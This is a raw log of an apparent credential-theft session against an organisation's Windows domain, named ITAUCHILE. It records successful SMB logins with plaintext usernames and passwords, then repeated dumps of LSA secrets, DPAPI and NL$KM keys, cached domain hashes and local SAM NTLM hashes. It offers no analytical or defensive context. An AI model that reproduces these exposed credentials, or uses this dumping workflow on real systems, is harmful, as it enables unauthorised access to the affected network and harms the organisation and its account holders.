12-22-2020 18:50:06 [*] KTHXBYE
12-22-2020 18:51:18 [*] PREVIRTUAL020.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL020) (domain:ITAUCHILE)
12-22-2020 18:51:18 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:51:24 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:51:28 CRPA4170:b41a4f3a622f6d4e10c1fad654fc9699:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:29 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:30 CRPA0780:4fd6251943d051898cb8846f010f0640:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:33 ITAUCHILE\PREVIRTUAL020$:aad3b435b51404eeaad3b435b51404ee:196663d5a86c8689c2380628aeec4038:::
12-22-2020 18:51:35 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:51:37 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 18:57:08 [*] PREVIRTUAL020.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL020) (domain:ITAUCHILE)
12-22-2020 18:57:08 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:57:14 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:57:19 eaglebkb:500:aad3b435b51404eeaad3b435b51404ee:156276fbc16f37c8c5671012cd9ea5eb:::
12-22-2020 18:57:21 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:57:23 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:7325e48346606ff05623b40124bf0d33:::
12-22-2020 18:57:25 robotics:1004:aad3b435b51404eeaad3b435b51404ee:961c3a6675437ddf58459ebc15a80712:::
12-22-2020 19:00:06 [*] PREVIRTUAL020.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL020) (domain:ITAUCHILE)
12-22-2020 19:00:06 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 19:00:11 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 19:00:16 CRPA4170:b41a4f3a622f6d4e10c1fad654fc9699:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:17 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:18 CRPA0780:4fd6251943d051898cb8846f010f0640:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:20 ITAUCHILE\PREVIRTUAL020$:aad3b435b51404eeaad3b435b51404ee:196663d5a86c8689c2380628aeec4038:::
12-22-2020 19:00:23 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 19:00:24 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:07:36 [*] PREVIRTUAL020.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL020) (domain:ITAUCHILE)
12-22-2020 21:07:44 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:07:49 [+] PREVIRTUAL020.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:07:53 CRPA4170:b41a4f3a622f6d4e10c1fad654fc9699:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:54 EEAA4651:b2cd74ce8c9bffc27b152272de867141:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:55 CRPA0780:4fd6251943d051898cb8846f010f0640:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:07:58 ITAUCHILE\PREVIRTUAL020$:aad3b435b51404eeaad3b435b51404ee:196663d5a86c8689c2380628aeec4038:::
12-22-2020 21:08:00 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:08:02 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
